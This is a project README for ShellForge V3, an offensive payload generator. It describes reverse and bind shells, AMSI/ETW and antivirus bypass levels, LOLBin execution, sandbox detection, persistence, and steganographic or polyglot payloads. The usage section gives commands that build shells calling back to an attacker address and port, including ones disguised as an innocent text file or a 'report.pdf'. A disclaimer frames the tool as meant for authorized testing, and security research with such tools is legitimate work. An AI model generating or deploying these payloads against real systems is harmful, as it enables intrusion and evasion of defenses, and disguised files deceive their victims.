<div align="center">

# 🐚 ShellForge V3

![ShellForge](https://img.shields.io/badge/ShellForge-V3-red?style=for-the-badge)
![Python](https://img.shields.io/badge/Python-3.x-blue?style=for-the-badge)
![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)
![Status](https://img.shields.io/badge/Status-Active-success?style=for-the-badge)

**The most comprehensive, modular, and advanced shell generation framework.**

[Features](#-features) • [Installation](#-installation) • [Usage](#-usage) • [Disclaimer](#-disclaimer)

</div>

---

## 🚀 Overview

**ShellForge V3** is a complete rewrite of the legendary payload generator, designed for **Red Teamers**, **Pentesters**, and **Security Researchers**. It goes beyond simple reverse shells, offering **polyglot generation**, **polymorphic obfuscation**, **LOLBin bypasses**, and **steganography** in a single, powerful framework.

---

## 🔥 Key Features

### 🛡️ Red Team Arsenal
| Feature | Description |
| :--- | :--- |
| **Bind Shells** | Listen on target (Bypass NAT/Firewall) for PHP, Python, Bash, Perl, Ruby, PowerShell |
| **Sandbox Detection** | Anti-analysis checks (VM, RAM, Uptime) to prevent payload burns |
| **Persistence** | Registry Run Keys, Scheduled Tasks, Startup Folder LNKs |
| **Handler Mode** | Auto-staging with built-in HTTP server (`--serve`) |

### 🎭 Evasion & Obfuscation
- **Polymorphic Engine**: Dynamic obfuscation for scripts (PHP, Python, Bash, PowerShell).
  - *PowerShell*: Case Randomization, Backticks, String Splitting.
- **Steganography**:
  - *BMP LSB*: Hide payloads inside image pixels.
  - *Whitespace*: Hide payloads in tabs/spaces of text files.
- **True Polyglots**:
  - *PDF*: Embedded JavaScript triggers.
  - *PNG/JPG*: Payloads hidden in valid images.
  - *XML*: XXE Injection payloads.

### 🛠️ Advanced Bypasses (LOLBins)
- **MSBuild**: XML project files (`MSBuild.exe`)
- **AMSI Bypass**: PowerShell with embedded evasion
- **Squiblydoo**: SCT scriptlets (`regsvr32`)
- **WMIC**: XSL stylesheets (`wmic`)
- **InstallUtil**: .NET binaries (`InstallUtil.exe`)
- **AV/EDR Levels**: `--av-bypass {amsi|full|max}` (AMSI, AMSI+ETW, full chain)

### 📦 Massive Extension Support (40+)
| Category | Extensions |
| :--- | :--- |
| **Web** | `php`, `asp`, `aspx`, `jsp`, `cfm`, `js` |
| **System** | `python`, `bash`, `perl`, `ruby`, `lua`, `go`, `c` |
| **Windows** | `powershell`, `bat`, `vbs`, `hta` |
| **Rare** | `groovy`, `sql`, `yaml`, `tcl`, `awk`, `war` |
| **Payloads** | `cs`, `java`, `vba`, `html_smuggle` |

---

## 📦 Installation

```bash
git clone https://github.com/Wael-Rd/shellforge.git
cd shellforge
sudo pip3 install -e .
```

Now you can run `shellforge` from anywhere!

---

## ⚡ Usage Examples

### 1. Basic Reverse Shell
Generate a simple PHP shell:
```bash
shellforge 192.168.1.100 4444 php -o shell.php
```

### 2. Handler Mode (Auto-Staging)
The easiest way to use advanced bypasses. Starts a server and generates the payload:
```bash
shellforge 192.168.1.100 4444 amsi --serve
```

### 3. Steganography
Hide a shell in a README file using whitespace steganography:
```bash
shellforge 192.168.1.100 4444 bash --stego-txt README.txt -o innocent.txt
```

### 4. Polyglot PDF
Create a PDF that triggers a shell when opened:
```bash
shellforge 192.168.1.100 4444 pdf -o report.pdf
```

### 5. Obfuscated PowerShell
Generate an AMSI-bypassing payload with randomized signatures:
```bash
shellforge 192.168.1.100 4444 ps1 --obfuscate -o bypass.ps1
```

### 6. AV/EDR Bypass Levels
Pick how aggressive you want the evasion to be:
```bash
# AMSI-only
shellforge 192.168.1.100 4444 ps1 --av-bypass amsi -o amsi_only.ps1

# AMSI + ETW (recommended)
shellforge 192.168.1.100 4444 ps1 --av-bypass full -o full_bypass.ps1

# Full chain (AMSI + ETW + script block logging)
shellforge 192.168.1.100 4444 ps1 --av-bypass max -o max_bypass.ps1
```

---

## 🛡️ Disclaimer

> **⚠️ WARNING**
>
> This tool is for **educational purposes and authorized security testing only**. The authors are not responsible for any misuse. Always obtain permission before testing on systems you do not own.

---

<div align="center">
  Made with ❤️ by <a href="https://github.com/Wael-Rd">Wael-Rd</a>
</div>
